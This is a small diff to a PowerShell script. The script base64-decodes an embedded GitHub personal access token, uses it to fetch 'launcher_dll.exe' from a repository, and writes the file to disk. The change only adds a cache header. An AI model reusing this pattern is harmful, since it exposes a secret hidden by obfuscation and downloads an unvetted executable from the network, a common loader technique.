@@ -180,7 +180,10 @@ try	{
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
 		$q = '"'
-        $h = @{"Authorization" = "$String"}
+		$h = @{
+			"Authorization"  = "$String"
+			"Cache-Control"  = "no-cache"
+		}
         $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher_dll.exe' -Method 'GET' -Headers $h
 		Invoke-WebRequest $response.download_url -OutFile $contFile
         if (Test-Path $contFile) {
